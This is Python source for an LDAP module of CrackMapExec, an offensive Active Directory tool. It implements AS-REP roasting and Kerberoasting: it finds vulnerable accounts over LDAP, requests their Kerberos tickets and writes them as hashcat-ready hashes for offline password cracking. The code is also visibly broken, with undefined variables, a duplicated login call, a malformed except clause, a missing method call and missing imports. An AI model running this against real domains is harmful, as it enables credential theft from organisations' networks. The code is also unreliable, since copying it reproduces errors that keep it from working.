# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

import requests
import logging
import configparser
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from cme.connection import *
from cme.helpers.logger import highlight
from cme.logger import CMEAdapter
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.ldap import ldap as ldap_impacket
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from datetime import datetime,timedelta
from io import StringIO
from binascii import hexlify, unhexlify

class ldap(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ''
        self.nthash = ''
        self.baseDN = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        ldap_parser = parser.add_parser('ldap', help="own stuff using ldap", parents=[std_parser, module_parser])
        ldap_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        ldap_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        ldap_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        ldap_parser.add_argument("--port", type=int, choices={389, 636}, default=389, help="LDAP port (default: 389)")
        dgroup = ldap_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        
        egroup = ldap_parser.add_argument_group("Retrevie hash on the remote DC", "Options to get hashes from Kerberos")
        egroup.add_argument("--asreproast", help="Get AS_REP response ready to crack with hashcat")
        egroup.add_argument("--kerberoasting", help='Get TGS ticket ready to crack with hashcatcc')

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': 'LDAP',
                                        'host': self.host,
                                        'port': self.args.port,
                                        'hostname': self.hostname
                                        })

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except (DCERPCException, e):
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login('' , '')
        except:
            #if "STATUS_ACCESS_DENIED" in e:
            pass

        self.domain    = self.conn.getServerDNSDomainName()
        self.hostname  = self.conn.getServerName()
        self.server_os = self.conn.getServerOS()
        self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
        self.os_arch   = self.get_os_arch()

        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

        if not self.domain:
            self.domain = self.hostname

        try:
            '''plaintext_login
                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                (go home Windows, you're drunk)
            '''
            self.conn.logoff()
        except:
            pass

        if self.args.domain:
            self.domain = self.args.domain
        
        if self.args.local_auth:
            self.domain = self.hostname

        #Re-connect since we logged off
        self.create_conn_obj()

    def print_host_info(self):
        self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                                      self.hostname,
                                                                                      self.domain,
                                                                                      self.signing,
                                                                                      self.smbv1))

    def kerberos_login(self, aesKey, kdcHost):
        self.username = username
        self.password = password
        self.domain = domain
        # Create the baseDN
        domainParts = self.domain.split('.')
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        if self.kdcHost is not None:
            target = self.kdcHost
        else:
            target = domain

        try:
            ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                self.aesKey, kdcHost=self.kdcHost)
            ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)                                  
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                self.aesKey, kdcHost=self.kdcHost)
        self.search_as_rep(ldapConnection)
        return True


    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain
        # Create the baseDN
        domainParts = self.domain.split('.')
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        if self.kdcHost is not None:
            target = self.kdcHost
        else:
            target = domain

        if self.kerberos is False and self.password == '' and self.args.asreproast:
            self.getTGT_asroast(self.username)
            return False
        # Connect to LDAP
        try:
            ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
            ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
        if self.args.asreproast:
            self.search_as_rep(ldapConnection)
        elif self.args.kerberoasting:
            self.search_kerberoasting(ldapConnection)
        return True

    def create_smbv1_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)
            self.smbv1 = True
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('SMBv1 might be disabled on {}'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def search_as_rep(self, ldapConnection):
        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                    "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                    (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                        attributes=['sAMAccountName',
                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                        sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                self.logger.error("Authentication failed")
                return False

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            for user in answers:
                self.getTGT_asroast(user[0])
            return True
        else:
            self.logger.error("No entries found!")

    def search_kerberoasting(self, ldapConnection):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                self.logger.error("Authentication failed")
                return

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers)>0:
            users = dict( (vals[1], vals[0]) for vals in answers)
            TGT = self.getTGT_kerberoasting()
            for user, SPN in users.items():
                try:
                    serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
                                                                            self.kdcHost,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('SPN: %s - %s' % (SPN,str(e)))
        else:
            print("No entries found!")

    def create_smbv3_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445)
            self.smbv1 = False
        except socket.error:
            return False
        except Exception as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_conn_obj(self):
        if self.create_smbv1_conn():
            return True
        elif self.create_smbv3_conn():
            return True

        return False

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT_asroast(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            logger.error('Empty Domain not allowed in Kerberos')
            return

        reqBody['realm'] = domain
        now = datetime.utcnow() + timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.kdcHost)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            logging.debug('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
            return

        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        hash_TGT =  '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                                hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        self.logger.info(u'{}'.format(hash_TGT))
        with open(self.args.asreproast, 'a+') as hash_asreproast:
            if self.host not in hash_asreproast.read():
                hash_asreproast.write(hash_TGT + '\n')
        return ''

    def getTGT_kerberoasting(self):
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            # No cache present
            pass
        else:
            # retrieve user and domain information from CCache file if needed
            if self.domain == '':
                domain = ccache.principal.realm['data']
            else:
                domain = self.__domain
            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                logging.debug('Using TGT from cache')
                return TGT
            else:
                logging.debug("No valid credentials found in cache. ")

        # No TGT in cache, request it
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.password != '' and (self.lmhash == '' and self.nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.domain,
                                                                compute_lmhash(self.password),
                                                                compute_nthash(self.password), self.aesKey,
                                                                kdcHost=self.kdcHost)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
                                                                    unhexlify(self.lmhash),
                                                                    unhexlify(self.nthash), self.aesKey,
                                                                    kdcHost=self.kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
                                                                unhexlify(self.lmhash),
                                                                unhexlify(self.nthash), self.aesKey,
                                                                kdcHost=self.kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        self.logger.info(u'{}'.format(entry))
        with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
            if self.host not in hash_kerberoasting.read():
                hash_kerberoasting.write(entry + '\n')
